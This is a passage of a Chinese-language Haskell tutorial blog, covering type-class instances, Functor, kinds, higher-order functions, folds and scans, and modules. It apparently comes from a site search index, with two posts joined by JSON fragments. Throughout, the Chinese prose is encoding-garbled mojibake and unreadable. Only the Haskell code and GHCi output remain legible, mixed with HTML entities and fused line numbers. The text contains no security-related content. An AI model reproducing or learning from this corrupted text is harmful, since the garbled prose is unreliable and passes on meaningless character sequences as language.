æ‰‹åŠ¨åˆ›å»ºå®ä¾‹ä½¿ä¸€ä¸ªç±»å‹æˆä¸ºä¸€ä¸ªç±»å‹ç±»çš„å®ä¾‹å¯ä»¥ç›´æ¥ä½¿ç”¨derivingæ¥è‡ªåŠ¨å®Œæˆï¼Œä¹Ÿå¯ä»¥é€šè¿‡ä½¿ç”¨instanceå…³é”®å­—æ¥æ‰‹åŠ¨å®Œæˆã€‚æ¯”å¦‚ä½¿Pointæˆä¸ºShowçš„å®ä¾‹ï¼š 123456instance Show Point where show (Point x y) = &quot;(&quot; ++ show x ++ &quot;, &quot; ++ show y ++ &quot;)&quot;-- in ghcighci&gt; Point 1.0 2.0(1.0, 2.0) è¿™æ ·å°±å¯ä»¥è‡ªå®šä¹‰æ˜¾ç¤ºçš„å†…å®¹ï¼Œå¦åˆ™ä½¿ç”¨derivingçš„è¯åªä¼šç›´æ¥å°†å…¶è½¬åŒ–ä¸ºå­—ç¬¦ä¸²ã€‚ åŒæ—¶ä¹Ÿè¦æ³¨æ„ç±»å‹å’Œç±»å‹æ„é€ å™¨çš„åŒºåˆ«ï¼Œä¼ å…¥ç»™instanceçš„ç¬¬äºŒä¸ªå‚æ•°åº”è¯¥ä¸ºç±»å‹è€Œä¸æ˜¯ç±»å‹æ„é€ å™¨ï¼Œæ¯”å¦‚Maybeï¼š 123456789101112instance Eq Maybe where ... -- é”™è¯¯ç”¨æ³•ï¼Œå› ä¸ºMaybeæ˜¯ç±»å‹æ„é€ å™¨è€Œä¸æ˜¯ç±»å‹instance Eq (Maybe m) where ...-- é”™è¯¯ç”¨æ³•ï¼Œå› ä¸ºmä¸ä¸€å®šæ˜¯Eqçš„æˆå‘˜instance (Eq m) =&gt; Eq (Maybe m) where Just x == Just y = x == y Nothing == Nothing = True _ == _ = False Functor TypeclassFunctorä¹Ÿæ˜¯ä¸€ç§ç±»å‹ç±»ï¼Œå®ƒåªè§„å®šäº†ä¸€ä¸ªå‡½æ•°ï¼š 12class Functor f where fmap :: (a -&gt; b) -&gt; f a -&gt; f b å…¶ä¸­fæ˜¯ä¸€ä¸ªç±»å‹æ„é€ å™¨ï¼Œè€Œä¸æ˜¯ä¸€ä¸ªå…·ä½“ç±»å‹ Kindsä¸€ä¸ªå€¼çš„ç±»å‹å«åšç±»å‹ï¼ˆTypeï¼‰ï¼Œè€Œä¸€ä¸ªç±»å‹çš„ç±»å‹å«åšKindã€‚å¯ä»¥é€šè¿‡GHCiä¸­:kæ¥æŸ¥çœ‹Kindï¼š 12345678ghci&gt; :k IntInt :: *ghci&gt; :k MaybeMaybe :: * -&gt; *ghci&gt; :k Maybe IntMaybe Int :: *ghci&gt; :k EitherEither :: * -&gt; * -&gt; * å…¶ä¸­çš„æ˜Ÿå·*ä»£è¡¨äº†ä¸€ä¸ªå…·ä½“ç±»å‹ï¼ˆconcrete typeï¼‰ã€‚Intæœ¬èº«å°±æ˜¯ä¸€ä¸ªå…·ä½“ç±»å‹ï¼Œæ‰€ä»¥Intçš„Kindæ˜¯*ã€‚è€ŒMaybeæ˜¯ä¸€ä¸ªç±»å‹æ„é€ å™¨ï¼Œå®ƒæ¥æ”¶ä¸€ä¸ªå…·ä½“ç±»å‹è¿”å›ä¸€ä¸ªæ–°çš„å…·ä½“ç±»å‹ï¼Œæ‰€ä»¥Maybeçš„Kindæ˜¯* -&gt; *ã€‚å¦‚æœç»™Maybeä¼ å…¥äº†ä¸€ä¸ªIntï¼Œé‚£ä¹ˆå¾—åˆ°çš„Maybe Intå°±æ˜¯ä¸€ä¸ªå…·ä½“çš„ç±»å‹ï¼Œå®ƒçš„Kindå°±æ˜¯*ã€‚Eitherä¹Ÿæ˜¯ä¸€ä¸ªç±»å‹æ„é€ å™¨ï¼Œä½†å®ƒæ¥æ”¶ä¸¤ä¸ªç±»å‹æ‰äº§ç”Ÿä¸€ä¸ªæ–°çš„ç±»å‹ï¼Œæ‰€ä»¥Eitherçš„Kindæ˜¯* -&gt; * -&gt; *ã€‚ Reference Learn You a Haskell ç›®å½• #0&nbsp;|&nbsp;æ€»ç« &emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;#1&nbsp;|&nbsp;åŸºç¡€è¯­æ³•ä¸å‡½æ•°&emsp;&emsp;&emsp;#2&nbsp;|&nbsp;é«˜é˜¶å‡½æ•°ä¸æ¨¡å—&emsp;&emsp;&emsp;#3&nbsp;|&nbsp;ç±»å‹ä¸ç±»å‹ç±»&emsp;&emsp;&emsp;&emsp;#4&nbsp;|&nbsp;è¾“å…¥è¾“å‡ºä¸æ–‡ä»¶&emsp;&emsp;&emsp;#5&nbsp;|&nbsp;å‡½å­ã€åº”ç”¨å‡½å­ä¸å•å­#6&nbsp;|&nbsp;åŠç¾¤ä¸å¹ºåŠç¾¤&emsp;&emsp;&emsp;&emsp;#7&nbsp;|&nbsp;ä¸€äº›å…¶å®ƒç±»å‹ç±»&emsp;&emsp;&emsp;#A&nbsp;|&nbsp;Haskellä¸èŒƒç•´è®º&emsp;&nbsp;&thinsp;","link":"/p/369b7e08.html"},{"title":"ã€ŒLearn Haskellã€#2 é«˜é˜¶å‡½æ•°ä¸æ¨¡å—","text":"&lt; #1 #3 &gt; Higher Order FunctionsCurryingHaskellä¸­çš„å‡½æ•°æ˜¯æŸ¯é‡ŒåŒ–ï¼ˆCurryingï¼‰çš„ï¼Œå¯ä»¥çœ‹ä½œæ‰€æœ‰å‡½æ•°éƒ½åªæ¥æ”¶ä¸€ä¸ªå‚æ•°ï¼Œè€Œæ¥æ”¶ä¸¤ä¸ªå‚æ•°çš„å‡½æ•°å®é™…ä¸Šæ˜¯è¿™ä¸ªå‡½æ•°æ¥æ”¶äº†ç¬¬ä¸€ä¸ªå‚æ•°åè¿”å›äº†ä¸€ä¸ªæ¥æ”¶ç¬¬äºŒä¸ªå‚æ•°çš„å‡½æ•°ï¼Œç„¶åç”¨è¿™ä¸ªå‡½æ•°æ¥æ”¶ç¬¬äºŒä¸ªå‚æ•°ï¼Œè¿”å›æœ€ç»ˆçš„ç»“æœã€‚æ¯”å¦‚maxå‡½æ•°ï¼Œå®ƒçš„ç±»å‹ç­¾åæ˜¯ï¼š max :: Ord a => a -> a -> a å¯ä»¥çœ‹æˆa -&gt; (a -&gt; a)ï¼Œå³æ¥æ”¶ä¸€ä¸ªå‚æ•°ï¼Œè¿”å›ä¸€ä¸ªç±»å‹ä¸ºa -&gt; açš„å‡½æ•°ã€‚æ¯”å¦‚max 1çš„ç±»å‹ç­¾åæ˜¯ï¼š max 1 :: (Ord a, Num a) => a -> a å› æ­¤max 1 2ï¼Œä¹Ÿå°±ç­‰åŒäº(max 1) 2ï¼Œå³å°†å‡½æ•°max 1åº”ç”¨åœ¨æ•°å­—2ä¸Š åŒæ—¶ï¼Œå‡½æ•°ä¹Ÿå¯ä»¥æ¥æ”¶å‡½æ•°ä½œä¸ºå‚æ•°ï¼Œå‚æ•°æœ‰å‡½æ•°çš„å‡½æ•°å°±è¢«ç§°ä¸ºé«˜é˜¶å‡½æ•°ï¼ˆHigher Order Functionsï¼‰ ä¸€äº›é«˜é˜¶å‡½æ•°zipWithzipWith :: (a -> b -> c) -> [a] -> [b] -> [c] ç¬¬ä¸€ä¸ªå‚æ•°ä¸ºä¸€ä¸ªå‡½æ•°ï¼Œç„¶åæ¥æ”¶ä¸¤ä¸ªåˆ—è¡¨ï¼Œå°†å…¶å¯¹åº”å…ƒç´ ä¼ å…¥æ¥æ”¶çš„å‡½æ•°ä¸­ï¼Œå¾—åˆ°çš„ç»“æœç»„æˆä¸€ä¸ªæ–°çš„åˆ—è¡¨ã€‚å¦‚æœä¸¤ä¸ªä¼ å…¥çš„åˆ—è¡¨é•¿åº¦ä¸åŒï¼Œä»¥æœ€çŸ­çš„åˆ—è¡¨ä¸ºå‡†ï¼Œé•¿åˆ—è¡¨ä¸­è¶…å‡ºçš„å…ƒç´ çœç•¥ã€‚ç”¨ä¾‹ï¼š 1234ghci&gt; zipWith (+) [4,2,5,6] [2,6,2,3] [6,8,7,9] ghci&gt; zipWith max [6,3,2,1] [7,3,1,5] [7,3,2,5] flipflip :: (a -> b -> c) -> b -> a -> c flipå‡½æ•°æ¥æ”¶ä¸€ä¸ªäºŒå…ƒå‡½æ•°ï¼Œè¿”å›ä¸€ä¸ªæ–°çš„äºŒå…ƒå‡½æ•°ï¼Œå°†å…¶è¾“å…¥çš„ä¸¤ä¸ªå‚æ•°é¡ºåºåè¿‡æ¥ï¼š 1234ghci&gt; zip [1,2,3,4,5] &quot;hello&quot;[(1,'h'),(2,'e'),(3,'l'),(4,'l'),(5,'o')]ghci&gt; flip zip [1,2,3,4,5] &quot;hello&quot; [('h',1),('e',2),('l',3),('l',4),('o',5)] mapmap :: (a -> b) -> [a] -> [b] mapå‡½æ•°æ¥æ”¶ä¸€ä¸ªå‡½æ•°få’Œä¸€ä¸ªåˆ—è¡¨aï¼Œå°†å‡½æ•°fåº”ç”¨åœ¨åˆ—è¡¨açš„æ¯ä¸ªå…ƒç´ ä¸­ï¼Œå¹¶è¿”å›å¾—åˆ°çš„æ‰€æœ‰ç»“æœç»„æˆçš„åˆ—è¡¨bï¼š 12ghci&gt; map (+3) [1,5,3,1,6] [4,8,6,4,9] filterfilter :: (a -> Bool) -> [a] -> [a] filterå‡½æ•°æ¥æ”¶ä¸€ä¸ªå‡½æ•°få’Œä¸€ä¸ªåˆ—è¡¨aï¼Œå°†åˆ—è¡¨aä¸­çš„æ¯ä¸ªå…ƒç´ ä¼ å…¥å‡½æ•°fä¸­ï¼Œå¦‚æœç»“æœä¸ºTrueå°±ä¿ç•™ï¼Œç»“æœä¸ºFalseå°±æŠ›å¼ƒï¼Œè¿”å›æ‰€æœ‰ä¿ç•™çš„å…ƒç´ ç»„æˆçš„æ–°åˆ—è¡¨ï¼š 12ghci&gt; filter even [1..10] [2,4,6,8,10] takeWhiletakeWhile :: (a -> Bool) -> [a] -> [a] takeWhileå‡½æ•°æ¥æ”¶ä¸€ä¸ªå‡½æ•°få’Œä¸€ä¸ªåˆ—è¡¨aï¼Œå°†åˆ—è¡¨aä¸­ä»å·¦å‘å³æ¯ä¸ªå…ƒç´ ä¼ å…¥å‡½æ•°fï¼Œç›´åˆ°ç»“æœä¸ºFalseåœæ­¢ï¼Œè¿”å›åœæ­¢å‰ä¼ å…¥çš„æ‰€æœ‰å…ƒç´ ç»„æˆçš„æ–°åˆ—è¡¨ï¼š 12ghci&gt; takeWhile (/=' ') &quot;word1 word2&quot;&quot;word1&quot; Function applicationå‡½æ•°åº”ç”¨å¯ä»¥ä½¿ç”¨$ï¼Œ$æ˜¯ä¸€ä¸ªå‡½æ•°ï¼Œå®ƒçš„ç±»å‹æ˜¯ï¼š ($) :: (a -> b) -> a -> b å®ƒå¯ä»¥æ”¹å˜å‡½æ•°ç»“åˆä¼˜å…ˆçº§ï¼Œå°†å·¦ä¾§å‡½æ•°åº”ç”¨äºå…¨éƒ¨å³ä¾§å†…å®¹ä¸Šï¼Œç›¸å½“äºç»™å³ä¾§æ•´ä½“åŠ ä¸Šäº†æ‹¬å·ã€‚å¦åˆ™å‡½æ•°é»˜è®¤å·¦ç»“åˆï¼Œä¼šä¾æ¬¡å‘å³åº”ç”¨è€Œä¸ä¼šåº”ç”¨åœ¨æ•´ä½“ä¸Šã€‚ 1234567f $ g x-- ç­‰ä»·äºf (g x)-----f g x-- ç­‰ä»·äº(f g) x Function Compositionå‡½æ•°å¤åˆå¯ä»¥ä½¿ç”¨.ï¼Œ.ä¹Ÿæ˜¯ä¸€ä¸ªå‡½æ•°ï¼Œå®ƒçš„ç±»å‹æ˜¯ï¼š (.) :: (b -> c) -> (a -> b) -> a -> c å®šä¹‰æ˜¯ï¼š f . g = \\x -> f (g x) ä½†æ˜¯å‡½æ•°å¤åˆçš„ä¼˜å…ˆçº§è¦æ¯”å‡½æ•°æ‰§è¡Œä½ï¼Œæ¯”å¦‚ï¼š 1sum . replicate 5 . max 6.7 8.9 ä¼šå…ˆæ‰§è¡Œmax 6.7 8.9å¹¶è¿”å›8.9ï¼Œç„¶åå°†sumã€replicate 5ã€8.9å¤åˆï¼Œä½†ä¸¤ä¸ªå‡½æ•°æ— æ³•å’Œä¸€ä¸ªå€¼(8.9)å¤åˆï¼Œæ‰€ä»¥ä¼šæŠ›å‡ºå¼‚å¸¸ã€‚å› æ­¤è¦ä½¿ç”¨$æ¥è§„å®šå…ˆå¤åˆå†æ‰§è¡Œï¼š 1sum . replicate 5 . max 6.7 $ 8.9 lambdaHaskellè¯­è¨€ä¸­çš„lambdaè¡¨è¾¾å¼æ˜¯ç”¨\\æ¥è¡¨ç¤ºçš„ï¼ˆå› ä¸ºçœ‹ç€åƒ$\\mathtt{\\lambda}$ï¼Ÿï¼‰å…·ä½“è¯­æ³•æ˜¯ 1\\para1 para2 ... -&gt; return â€œ-&gt;â€å‰çš„ para1 para2 â€¦ æ˜¯ä¼ å…¥å‚æ•°ï¼Œå•ä¸ªå¤šä¸ªéƒ½å¯ä»¥ï¼Œéœ€è¦ç”¨ç©ºæ ¼éš”å¼€ï¼›â€-&gt;â€åçš„ return æ˜¯è®¡ç®—å¾—åˆ°çš„è¿”å›å€¼ã€‚ä¸€èˆ¬éœ€è¦ç”¨æ‹¬å·å°†æ•´ä¸ªè¡¨è¾¾å¼æ‹¬èµ·æ¥ï¼Œé˜²æ­¢è¿”å›å€¼éƒ¨åˆ†ä¸€ç›´å‘å³å»¶ä¼¸ã€‚ foldå’Œscanfoldå’Œscanéƒ½æ¥æ”¶ä¸‰ä¸ªå‚æ•°ï¼ˆä¸€ä¸ªäºŒå…ƒå‡½æ•°ï¼Œä¸€ä¸ªåˆå§‹å€¼accumulatorï¼Œä¸€ä¸ªè¦æŠ˜å çš„åˆ—è¡¨ï¼‰ï¼Œfoldè¿”å›ä¸€ä¸ªå€¼ï¼Œè€Œscanè¿”å›ä¸€ä¸ªåˆ—è¡¨ä¼ å…¥çš„äºŒå…ƒå‡½æ•°f :: a -&gt; b -&gt; bå°†accumulatorå’Œä»åˆ—è¡¨ä¸­å–å‡ºçš„å€¼ä¸€åŒä¼ å…¥ï¼ˆlåˆ™accumulatoråœ¨å·¦è¾¹ä¸ºç¬¬ä¸€ä¸ªå‚æ•°ï¼Œråˆ™accumulatoråœ¨å³è¾¹ä¸ºç¬¬äºŒä¸ªå‚æ•°ï¼‰ foldlå·¦æŠ˜å ï¼Œæ¯æ¬¡ä»åˆ—è¡¨æœ€å·¦ä¾§å–å‡ºä¸€ä¸ªå€¼ï¼Œå’Œaccumulatorä¸€èµ·ä¼ å…¥äºŒå…ƒå‡½æ•°ï¼Œå¹¶ä¸”accumulatoråœ¨å·¦è¾¹ä¸ºç¬¬ä¸€ä¸ªå‚æ•°ï¼Œå¦‚ï¼š 1foldl f a xs å®ƒçš„ç»“æœè®¡ç®—è¿‡ç¨‹ä¸º 1234&gt; foldl f a [x1, x2, x3][1.] a = f a x1[2.] a = f a x2 = f (f a x1) x2[3.] a = f a x3 = f (f (f a x1) x2) x3 å¯ä»¥çœ‹å‡º f (f a x1) x2 å…¶å®å°±æ˜¯ foldl f a [x1, x2]è€Œä¸”å› æ­¤ï¼Œfoldlåœ¨è®¡ç®—æ—¶æœ€å¤–å±‚éœ€è¦æ‰¾åˆ°x3ï¼Œè¿™æ ·å¦‚æœxsæ˜¯ä¸€ä¸ªæ— ç©·åˆ—è¡¨ï¼Œé‚£ä¹ˆå°†æ— æ³•è®¡ç®—ï¼Œé™·å…¥æ— ç©·ã€‚æ‰€ä»¥foldlè™½ç„¶çœ‹èµ·æ¥ä»å·¦è¾¹å–å€¼ï¼Œä½†æ˜¯å‡½æ•°éœ€è¦ä»å³ä¾§å±•å¼€ï¼Œå¹¶ä¸é€‚ç”¨äºæ— ç©·åˆ—è¡¨ foldrå³æŠ˜å ï¼Œæ¯æ¬¡ä»åˆ—è¡¨æœ€å³ä¾§å–å‡ºä¸€ä¸ªå€¼ï¼Œå’Œaccumulatorä¸€èµ·ä¼ å…¥äºŒå…ƒå‡½æ•°ï¼Œå¹¶ä¸”accumulatoråœ¨å³è¾¹ä¸ºç¬¬äºŒä¸ªå‚æ•°ï¼Œå¦‚ï¼š 1foldr f a xs å®ƒçš„ç»“æœè®¡ç®—è¿‡ç¨‹ä¸º 1234&gt; foldr f a [x1, x2, x3][1.] a = f x3 a[2.] a = f x2 a = f x2 (f x3 a)[3.] a = f x1 a = f x1 (f x2 (f x3 a)) ä»ä¸­å¯ä»¥çœ‹å‡º f x2 (f x3 a) å°±æ˜¯ foldr f a [x2, x3]å› æ­¤å¯ä»¥ä½¿ç”¨é€’å½’æ¥å†™ä¸€ä¸ªå’Œfoldræ•ˆæœä¸€æ ·çš„å‡½æ•°: 123foldr' :: (a -&gt; b -&gt; b) -&gt; b -&gt; [a] -&gt; bfoldr' _ x [] = xfoldr' f a (x:xs) = f x (foldr' f a xs) ä¹Ÿå¯ä»¥çœ‹å‡ºï¼Œæœ€å¤–å±‚è®¡ç®—æ—¶åªéœ€è¦x1å¹¶ä¸”å‘ä¸‹é€’å½’ï¼Œå¹¶ä¸ä¼šæ¥è§¦åˆ°åˆ—è¡¨æœ«å°¾ï¼Œå› æ­¤å¯ä»¥ç”¨äºæ— ç©·åˆ—è¡¨ã€‚foldrå³ä½¿çœ‹ä¸Šå»ä»å³è¾¹å–å€¼ï¼Œä½†æ˜¯è¦ä»å·¦å¼€å§‹å±•å¼€ï¼Œå¯ä»¥ç”¨äºæ— ç©·åˆ—è¡¨ ä¾‹å¦‚ï¼š 12345ghci&gt; foldr (||) False (repeat True)True -- ç”±äºé€»è¾‘è¿ç®—å­˜åœ¨çŸ­è·¯ï¼Œè®¡ç®—å€¼å…¨åº”ä¸ºTrueï¼Œæ‰€ä»¥ç›´æ¥è¿”å›äº†ghci&gt; foldl (||) False (repeat True)-- è¿™é‡Œä»€ä¹ˆéƒ½ä¸ä¼šå‘ç”Ÿï¼Œç›´åˆ°ç”µè„‘å†…å­˜è¢«çˆ†æ‰-- å› ä¸ºå‡½æ•°åˆšå¼€å§‹å°±éœ€è¦åˆ—è¡¨æœ€å³ä¾§çš„å€¼ï¼Œæ‰€ä»¥åœ¨ä¸æ–­è®¡ç®—è¿™ä¸ªæ— ç©·åˆ—è¡¨ scanlå’Œscanrscanç±»ä¼¼foldï¼Œåªæ˜¯å°†ä¸­é—´å¾—åˆ°çš„æ¯ä¸€ä¸ªå€¼éƒ½æ·»åŠ è¿›ä¸€ä¸ªåˆ—è¡¨ä¸­å¹¶è¿”å›è¿™ä¸ªåˆ—è¡¨scanlåˆ™å‘å³å»¶ä¼¸è¿™ä¸ªåˆ—è¡¨ï¼Œscanråˆ™å‘å·¦å»¶ä¼¸è¿™ä¸ªåˆ—è¡¨ä½†æ˜¯å®ƒå’Œfoldæ°æ°ç›¸åï¼Œscanlèƒ½ç”¨äºæ— ç©·åˆ—è¡¨ï¼Œè€Œscanrä¸èƒ½ 12345&gt; scanr f a [x1, x2, x3][1.] æœ€å³ä¾§å…ƒç´ (-1 in python) : a[2.] å³ä¾§ç¬¬äºŒä¸ªå…ƒç´ (-2) : f x3 a[3.] å³ä¾§ç¬¬ä¸‰ä¸ªå…ƒç´ (-3) : f x2 (f x3 a)[4.] å³ä¾§ç¬¬å››ä¸ªå…ƒç´ (-4) : f x1 (f x2 (f x3 a)) å¯ä»¥çœ‹å‡º f x2 (f x3 a) æ˜¯ foldr f a [x2, x3]ï¼Œä¹Ÿæ˜¯ scanr f a [x2, x3] çš„ç¬¬ä¸€ä¸ªå…ƒç´ å› æ­¤å¯ä»¥ç”¨é€’å½’æ¥å†™ä¸€ä¸ªå’Œscanræ•ˆæœä¸€æ ·çš„å‡½æ•°ï¼š 12345scanr' :: (a -&gt; b -&gt; b) -&gt; b -&gt; [a] -&gt; [b]scanr' _ x [] = [x]-- scanr' f a (x:xs) = f x (foldr f a xs) : scanr' f a xsscanr' f a (x:xs) = f x q : qs where qs@(q:_) = scanr' f a xs scanlä¹Ÿæ˜¯åŒç†ï¼š 123scanl' :: (b -&gt; a -&gt; b) -&gt; b -&gt; [a] -&gt; [b]scanl' _ x [] = [x]scanl' f a (x:xs) = a : scanl' f (f a x) xs ä¹Ÿå¯ä»¥çœ‹å‡ºï¼Œscanrè¿”å›çš„åˆ—è¡¨çš„ç¬¬ä¸€ä¸ªå…ƒç´ æ˜¯æœ€åæ·»åŠ è¿›å»çš„ï¼Œæ‰€ä»¥å®ƒæ— æ³•ç”¨äºæ— ç©·åˆ—è¡¨ã€‚è€Œscanlè¿”å›çš„åˆ—è¡¨ä¸­çš„å…ƒç´ æ˜¯ä»å·¦åˆ°å³ä¾æ¬¡æ·»åŠ ï¼Œå¯ä»¥ç”¨äºæ— ç©·åˆ—è¡¨æˆªå–å‰ä¸€éƒ¨åˆ†ç»“æœï¼š 1234ghci&gt; take 10 (scanl (+) 0 [1..])[0,1,3,6,10,15,21,28,36,45]ghci&gt; take 10 (scanr (+) 0 [1..])[*** Exception: stack overflow ä½¿ç”¨foldrç¼–å†™foldlpdcxsè¿˜ç»™æˆ‘ä»‹ç»äº†ä¸€ä¸ªç¥å¥‡çš„æ“ä½œï¼Œç”¨foldlæ¥å®šä¹‰foldrï¼š 1foldl' f z xs = foldr (\\x g y -&gt; g (f y x)) id xs z å®ƒåˆ©ç”¨ foldr (\\x g y -&gt; g (f y x)) id xs ç”Ÿæˆä¸€ä¸ªå‡½æ•°ï¼Œä½œç”¨äºzå¾—åˆ°ç»“æœã€‚ å…ˆæ¥çœ‹ä¸€ä¸‹foldrçš„ç±»å‹ï¼š 12foldr :: Foldable t =&gt; (a -&gt; b -&gt; b) -&gt; b -&gt; t a -&gt; b-- å¯ä»¥çœ‹æˆ (a -&gt; b -&gt; b) -&gt; b -&gt; [a] -&gt; b ä½†æ˜¯åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œç±»å‹bå¹¶ä¸æ˜¯ä¸€ä¸ªæ•°å­—ï¼Œè€Œæ˜¯ä¸€ä¸ªå‡½æ•°(b -&gt; b)ã€‚ æ‰€ä»¥è¿™é‡Œfoldrçš„ç±»å‹å¯ä»¥å†™æˆï¼š (a -> (b -> b) -> (b -> b)) -> (b -> b) -> [a] -> (b -> b) å¯¹åº”äºç”¨æ³• foldr (\\x g y -&gt; g (f y x)) id xs ï¼Œå®ƒè¿”å›çš„å€¼åº”è¯¥æ˜¯ä¸€ä¸ªå‡½æ•°ï¼Œç±»å‹ä¸º b -&gt; bï¼ˆåé¢è¦ä½œç”¨äºzï¼‰è€Œxså¯¹åº”äº[a]ï¼›idå¯¹åº”äº(b -&gt; b)æ‰€ä»¥ (\\x g y -&gt; g (f y x)) è¦å¯¹åº”äºï¼š (a -> (b -> b) -> (b -> b)) å› æ­¤å¯ä»¥æ¨æ–­å‡ºxçš„ç±»å‹æ˜¯aï¼›yçš„ç±»å‹æ˜¯bï¼›è€Œè¿”å›çš„å€¼ä¸ºä¸€ä¸ªç±»å‹ä¸º(b -&gt; b)çš„å‡½æ•°ã€‚ å†çœ‹ï¼Œè¿”å›çš„å€¼æ˜¯ g (f y x) ï¼Œå…¶ä¸­ f y x è¿”å›çš„æ˜¯ä¸€ä¸ªå€¼ï¼Œç±»å‹ä¸ºbæ‰€ä»¥gæ¥æ”¶ä¸€ä¸ªç±»å‹bï¼Œè¿”å›ä¸€ä¸ªç±»å‹b -&gt; bã€‚å³gçš„ç±»å‹ä¸ºï¼š b -> (b -> b) ç°åœ¨æ ¹æ®foldrçš„å®šä¹‰ï¼š foldr f a (x:xs) = f x (foldr f a xs) å¸¦å…¥è®¡ç®—ä¸€ä¸‹ï¼š xså³ä¸º[x1..xn]ï¼Œä¸ºäº†æ–¹ä¾¿ï¼Œç”¨xsâ€™æ¥è¡¨ç¤º[x2..xn]ï¼Œç”¨xsâ€™â€™æ¥è¡¨ç¤º[x3..xn] å®šä¹‰ä¸­çš„få³ä¸º(\\x g y -&gt; g (f y x))ï¼Œaå³ä¸ºid 12 foldr (\\x g y -&gt; g (f y x)) id xs z= (\\x g y -&gt; g (f y x)) x1 (foldr (...) id xs') z å†™å®Œç¬¬ä¸€æ­¥ï¼Œå¯ä»¥å‘ç°ï¼Œx1 (foldr (â€¦) id xsâ€™) z æ­£å¥½åˆ†åˆ«å¯¹åº”äº†lambdaè¡¨è¾¾å¼ä¸­çš„xã€gã€yã€‚å¯ä»¥å°†å…¶åº”ç”¨ï¼Œè¿›ä¸€æ­¥å±•å¼€ï¼š 12 (\\x g y -&gt; g (f y x)) x1 (foldr (...) id xs') z= (foldr (...) id xs') (f z x1) ä¸éš¾å‘ç°ï¼ŒåŸå¼ (foldr (â€¦) id xs) z ç­‰ä»·äºï¼š (foldr (...) id xs') (f z x1) è·Ÿç€è¿™ä¸ªæ€è·¯ï¼Œxsæ¯æ¬¡å°‘ä¸€ä¸ªå¼€å¤´çš„å…ƒç´ xâ€™ï¼Œzæ¯æ¬¡å˜æ¢æˆä¸º f z xâ€™å› æ­¤ä¸‹ä¸€æ­¥ï¼š 12345 (\\x g y -&gt; g (f y x)) x1 (foldr (...) id xs') z= (foldr (...) id xs') (f z x1)= (foldr (...) id xs'') (f (f z x1) x2)= (foldr (...) id xs''') (f (f (f z x1) x2) x3)= ... å¯ä»¥å‘ç°ï¼Œå·²ç»æœ‰äº†è§„å¾‹ã€‚é‚£ä¹ˆæœ€ç»ˆåœæ­¢æ—¶æ˜¯ä»€ä¹ˆæ ·å‘¢ï¼Ÿ æœ€ååˆ°äº†ä¸èƒ½åœ¨å±•å¼€æ—¶ï¼Œæœ€å‰é¢çš„ foldr (â€¦) id xs å·²ç»å˜æˆäº† foldr (â€¦) id []è€Œæ ¹æ®å‰é¢foldrçš„å®šä¹‰ foldr _ x [] = x ï¼Œå®ƒåº”è¯¥è¿”å›id æ‰€ä»¥æœ€åçš„ç»“æœï¼š(idçš„å®šä¹‰ï¼šid x = x) 1234567 ...= (foldr (...) id xs') (f z x1)= (foldr (...) id xs'') (f (f z x1) x2)= ...= (foldr (...) id []) (f (.. (f z x1) ..) xn)= id (f (.. (f z x1) ..) xn)= f (.. (f z x1) ..) xn é‚£ä¹ˆæœ€åè¿™ä¸ªç»“æœå°±å¾ˆç†Ÿæ‚‰äº†ï¼Œå®ƒå°±æ˜¯ foldl f z xsã€‚æ‰€ä»¥æˆ‘ä»¬æ¨å¯¼å‡ºäº†è¿™ä¸ªç”¨foldrè¡¨ç¤ºfoldlçš„å†™æ³•æ˜¯æ­£ç¡®çš„ã€‚ ModulesHaskellä¼šè‡ªåŠ¨åŠ è½½Preludeæ¨¡å—ï¼ˆmoduleï¼‰ï¼Œå¦‚æœåœ¨GHCiä¸­å†åŠ è½½å…¶ä»–æ¨¡å—ï¼Œéœ€è¦ä½¿ç”¨:m + ...ï¼Œæ¯”å¦‚åŠ è½½Data.Listæ¨¡å—ï¼š Prelude> :m + Data.List è€Œåœ¨hsæ–‡ä»¶ä¸­å¼•å…¥æ¨¡å—ï¼Œéœ€è¦ä½¿ç”¨importè¯­å¥ï¼Œä¸‹é¢å’Œpythonçš„å¯¹æ¯”å¯ä»¥ä¾¿äºç†è§£ï¼š 1234567891011121314import Data.List-- from Data.List import *import Data.List (nub, sort)-- from Data.List import nub, sortimport Data.List hiding (nub)-- ä»Data.Listä¸­å¼•å…¥æ‰€æœ‰ï¼Œä½†ä¸å¼•å…¥nubå‡½æ•°import qualified Data.List-- import Data.Listimport qualified Data.List as Li-- import Data.List as Li ç¼–å†™Modulesæ¨¡å—ä¸­è¦åŒ…å«å°†è¦ä½¿ç”¨çš„ä¸€äº›å‡½æ•°ï¼Œåƒæ­£å¸¸çš„hsæ–‡ä»¶ä¸€æ ·å†™å³å¯ï¼Œä½†å¤´éƒ¨éœ€è¦æœ‰å¯¼å‡ºè¯­å¥ï¼ˆexportï¼‰ã€‚æ¯”å¦‚ä¸€ä¸ªæ¨¡å—æ–‡ä»¶åå«ModuleA.hsï¼Œé‚£å®ƒçš„å¤´éƒ¨éœ€è¦å†™ï¼š 123456module ModuleA( functionA, functionB, functionC) where è€Œä¸”æ–‡ä»¶ä¸­çš„æ‰€æœ‰å‡½æ•°åªå¯¼å‡ºéœ€è¦ä½¿ç”¨çš„å³å¯ã€‚æ¯”å¦‚è¯¥æ–‡ä»¶ä¸­è¿˜å«æœ‰functionDä¾›å‰ä¸‰ä¸ªå‡½æ•°å†…éƒ¨ä½¿ç”¨ï¼Œé‚£ä¹ˆåœ¨import ModuleAä¹‹åä¹Ÿæ— æ³•è°ƒç”¨functionDã€‚ Reference Learn You a Haskell Writing foldl using foldr - StackOverflow Haskellï¼šç”¨foldrå®šä¹‰foldl ç›®å½• #0&nbsp;|&nbsp;æ€»ç« &emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;#1&nbsp;|&nbsp;åŸºç¡€è¯­æ³•ä¸å‡½æ•°&emsp;&emsp;&emsp;#2&nbsp;|&nbsp;é«˜é˜¶å‡½æ•°ä¸æ¨¡å—&emsp;&emsp;&emsp;#3&nbsp;|&nbsp;ç±»å‹ä¸ç±»å‹ç±»&emsp;&emsp;&emsp;&emsp;#4&nbsp;|&nbsp;è¾“å…¥è¾“å‡ºä¸æ–‡ä»¶&emsp;&emsp;&emsp;#5&nbsp;|&nbsp;å‡½å­ã€åº”ç”¨å‡½å­ä¸å•å­#6&nbsp;|&nbsp;åŠç¾¤ä¸å¹ºåŠç¾¤&emsp;&emsp;&emsp;&emsp;#7&nbsp;|&nbsp;ä¸€äº›å…¶å®ƒç±»å‹ç±»&emsp;&emsp;&emsp;#A&nbsp;|&nbsp;Haskellä¸èŒƒç•´è®º&emsp;&nbs